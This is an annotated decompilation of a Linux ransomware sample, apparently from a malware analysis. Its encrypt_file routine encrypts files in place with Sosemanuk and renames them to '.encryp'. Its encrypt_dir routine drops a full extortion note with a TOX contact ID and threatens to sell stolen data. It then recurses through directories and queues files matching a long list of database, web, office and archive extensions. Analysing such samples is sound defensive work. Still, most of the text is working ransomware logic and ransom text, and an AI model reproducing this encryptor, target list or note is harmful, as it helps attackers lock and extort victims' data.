/* This file was generated by the Hex-Rays decompiler version 9.0.0.240807.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
*/

//-------------------------------------------------------------------------
// Function declarations

unsigned __int64 __fastcall encrypt_file(char *filename);
// unsigned __int64 __fastcall sosemanuk_schedule(sosemanuk_key_context *key_context, const void *key, size_t key_size);
// unsigned __int64 __fastcall sosemanuk_init(int *, _DWORD *, __int64 *, size_t);
// unsigned int *__fastcall sosemanuk_internal(unsigned int *);
// bool __fastcall xorbuf(char *, char *, _BYTE *, __int64);
// char __fastcall sosemanuk_encrypt(sosemanuk_run_context *ctx, char *in, _BYTE *out, unsigned __int64 data_len);
// sha256_context *__fastcall init_sha256(sha256_context *);
// _BYTE *__fastcall sha256_hash(_DWORD *, __int64, unsigned int);
// _BYTE *__fastcall sha256_done(__int64 *context, __int64 buf);
// int __fastcall xstat(char *filename, struct stat64 *stat_buf);

//-------------------------------------------------------------------------
// Data declarations

int total_encrypted_count;
__int64 total_encrypted_size;

//----- (000055555555687E) ----------------------------------------------------
unsigned __int64 __fastcall encrypt_file(char *filename)
{
  unsigned int total_read; // [rsp+14h] [rbp-13BCh]
  unsigned __int64 amt_read; // [rsp+20h] [rbp-13B0h]
  FILE *fp; // [rsp+28h] [rbp-13A8h]
  _BYTE *f_data; // [rsp+30h] [rbp-13A0h]
  sha256_context sha_context; // [rsp+40h] [rbp-1390h] BYREF
  sosemanuk_run_context runcontext; // [rsp+B0h] [rbp-1320h] BYREF
  stat64 fstat; // [rsp+140h] [rbp-1290h] BYREF
  sosemanuk_key_context keycontext; // [rsp+1D0h] [rbp-1200h] BYREF
  _BYTE end_data[32]; // [rsp+360h] [rbp-1070h] BYREF
  _BYTE data[32]; // [rsp+380h] [rbp-1050h] BYREF
  char key[32]; // [rsp+3A0h] [rbp-1030h] BYREF
  char dest[16]; // [rsp+3C0h] [rbp-1010h] BYREF
  unsigned __int64 _stack_canary; // [rsp+13C8h] [rbp-8h]

  _stack_canary = __readfsqword(0x28u);         // compiler-injected :)
  total_read = 0;
  if ( !xstat(filename, &fstat) )
  {
    fp = fopen(filename, "r+b");
    if ( fp )
    {
      f_data = malloc(CONST_BLOCK);
      if ( f_data )                             // if the memory can be allocated to fit a block of the file (10MB)
      {
        init_sha256(&sha_context);
        sha256_hash(&sha_context, data, 0x20u);
        sha256_done(&sha_context, key);
        memset(&sha_context, 0, sizeof(sha_context));
        sosemanuk_schedule(&keycontext, key, 0x20uLL);
        sosemanuk_init(&runcontext, &keycontext, 0LL, 0LL);
        memset(key, 0, sizeof(key));
        do
        {
          amt_read = fread(f_data, 1uLL, CONST_BLOCK, fp);// read 10MB
          total_read += amt_read;
          if ( !amt_read )
            break;
          sosemanuk_encrypt(&runcontext, f_data, f_data, amt_read);// encrypt data in-place
          fseek(fp, -amt_read, 1);              // jump back to the start of the block
          fwrite(f_data, 1uLL, amt_read, fp);   // and write the data back
          if ( total_read > 0x1FFFFFFF )
            break;
        }
        while ( total_read < fstat.st_size );
        memset(&keycontext, 0, sizeof(keycontext));
        memset(&runcontext, 0, sizeof(runcontext));
        _InterlockedAdd64(&total_encrypted_size, fstat.st_size);// add up the total size of the encrypted data
        fseek(fp, 0LL, 2);
        fwrite(end_data, 1uLL, 0x20uLL, fp);
        ++total_encrypted_count;
        free(f_data);
      }
      fflush(fp);
      fclose(fp);
      strcpy(dest, filename);
      *&dest[strlen(dest)] = 0x707972636E652ELL;
      rename(filename, dest);
    }
  }
  free(filename);
  return __readfsqword(0x28u) ^ _stack_canary;
}

//----- (0000555555556C1F) ----------------------------------------------------
int __fastcall encrypt_dir(const char *dir)
{
  char *allocated; // rax
  size_t dest_len; // rax
  char *dest; // [rsp+18h] [rbp-28h]
  FILE *ransom_note; // [rsp+20h] [rbp-20h]
  DIR *dirp; // [rsp+28h] [rbp-18h]
  struct dirent *file; // [rsp+30h] [rbp-10h]
  char *cur_file; // [rsp+38h] [rbp-8h]

  allocated = malloc(0x1001uLL);
  dest = allocated;
  if ( allocated )
  {
    strcpy(allocated, dir);
    strcat(dest, "/help-readme.txt");
    ransom_note = fopen(dest, "w");
    if ( ransom_note )
    {
      fwrite(
        "Hello friend\n"
        "\n"
        "No matter who you are or what position you hold, if you are reading this document, it means that your company's "
        "internal infrastructure has been partially or completely paralyzed, and all virtual or physical backups that we "
        "can access have been completely deleted. In addition, we have obtained a large amount of your company data befor"
        "e encryption. Okay, now let's put away the tears and resentment and try to establish a constructive dialogue. We"
        " fully understand the damage caused by locking up your internal resources. At present, you need to know the foll"
        "owing:\n"
        "\n"
        "1. You can save a lot of money by working with us, because we don't want to completely destroy your finances. We"
        " will deeply study your financial situation, bank income statements, savings, investments, etc., and make reason"
        "able requests to you. In addition, delaying the negotiation process will lead to the failure of the transaction."
        "\n"
        "\n"
        "2. Paying us can save you time, money and energy, and it will be back to normal in about 24 hours. Our decryptor"
        " works for any file or system, and you can request a test decryption service at the beginning of the conversatio"
        "n. If you decide to recover on your own, please remember that you may permanently lose access to certain files o"
        "r accidentally destroy files, in which case we will not be able to help.\n"
        "\n"
        "3. The security report or exclusive first-hand information you will receive after reaching an agreement is very "
        "valuable, because no complete network audit will show the vulnerabilities we detected and exploited during the i"
        "ntrusion, identify backup solutions and upload data. Regarding your data, if we fail to reach an agreement, we w"
        "ill try to sell personal information, trade secrets, databases, source code - in short, any valuable information"
        " to multiple black market threat parties.\n"
        "\n"
        "4. We are very willing to negotiate and quickly find a solution that satisfies both parties. If you are really i"
        "nterested in our services, you can contact us by following these simple steps:You can contact us only via TOX me"
        "ssenger, download and install Tox client from: https://tox.chat/download.html Add a friend with our TOX ID. Reme"
        "mber, the faster you contact, the less you will lose.\n"
        "\n"
        "TOX IDï¼š970F104D828F2696FF2508C0EFB3BEAB3220DFF8B7A45EBFBE86A1DBE2830B62CEBB32248B46\n"
        "\n"
        "5. Please contact us before November 1, US time, otherwise we will charge an additional ransom.\n" // nov 1st? recent sample...
        "\n",
        1uLL,
        0x95DuLL,
        ransom_note);
      fclose(ransom_note);
    }
    strcpy(dest, dir);
    allocated = opendir(dest);
    dirp = allocated;
    if ( allocated )
    {
      while ( 1 )
      {
        file = readdir(dirp);
        if ( !file )
          break;
        if ( strcmp(file->d_name, "..") && strcmp(file->d_name, ".") )// skip parent and current dir indicators
        {
          if ( file->d_type == 4 )              // dir
          {
            strcpy(dest, dir);
            *&dest[strlen(dest)] = 47;
            strcat(dest, file->d_name);
            encrypt_dir(dest);                  // recursively go into subdirs
          }
          else if ( file->d_type == 8 )         // normal file
          {
            if ( !strstr(file->d_name, ".encryp")// .encryp is the extension for encrypted files
              && (strstr(file->d_name, ".frm")
               || strstr(file->d_name, ".idb")
               || strstr(file->d_name, ".php")
               || strstr(file->d_name, ".bak")
               || strstr(file->d_name, ".sql")
               || strstr(file->d_name, ".MYD")
               || strstr(file->d_name, ".MYI")
               || strstr(file->d_name, ".opt")
               || strstr(file->d_name, ".js")
               || strstr(file->d_name, ".css")
               || strstr(file->d_name, ".html")
               || strstr(file->d_name, ".svg")
               || strstr(file->d_name, ".woff")
               || strstr(file->d_name, ".woff2")
               || strstr(file->d_name, ".eot")
               || strstr(file->d_name, ".ico")
               || strstr(file->d_name, ".png")
               || strstr(file->d_name, ".jpg")
               || strstr(file->d_name, ".jpeg")
               || strstr(file->d_name, ".gif")
               || strstr(file->d_name, ".mp4")
               || strstr(file->d_name, ".asp")
               || strstr(file->d_name, ".jsp")
               || strstr(file->d_name, ".mp3")
               || strstr(file->d_name, ".zip")
               || strstr(file->d_name, ".gz")
               || strstr(file->d_name, ".tar")
               || strstr(file->d_name, ".bz2")
               || strstr(file->d_name, ".json")
               || strstr(file->d_name, ".bk")
               || strstr(file->d_name, ".doc")
               || strstr(file->d_name, ".pdf")
               || strstr(file->d_name, ".xlsx")
               || strstr(file->d_name, ".xls")
               || strstr(file->d_name, ".xlt")
               || strstr(file->d_name, ".et")
               || strstr(file->d_name, ".xlsm")
               || strstr(file->d_name, ".db")
               || strstr(file->d_name, ".csv")
               || strstr(file->d_name, ".xltx")
               || strstr(file->d_name, ".xltm")
               || strstr(file->d_name, ".mht")
               || strstr(file->d_name, ".mhtml")
               || strstr(file->d_name, ".dbf")
               || strstr(file->d_name, ".mdb")
               || strstr(file->d_name, ".vue")) )
            {
              ++total_file_count;
              strcpy(dest, dir);
              *&dest[strlen(dest)] = 47;
              strcat(dest, file->d_name);
              dest_len = strlen(dest);
              cur_file = malloc(dest_len + 1);
              strcpy(cur_file, dest);
              printf("Encrypting: %s\n", cur_file);
              thpool_add_work(thread_pool, encrypt_file, cur_file);
            }
            else                                // skip if it doesn't match
            {
              ++total_file_count;
              ++skipped_file_count;
            }
          }
        }
      }
      LODWORD(allocated) = closedir(dirp);
    }
  }
  return allocated;
}
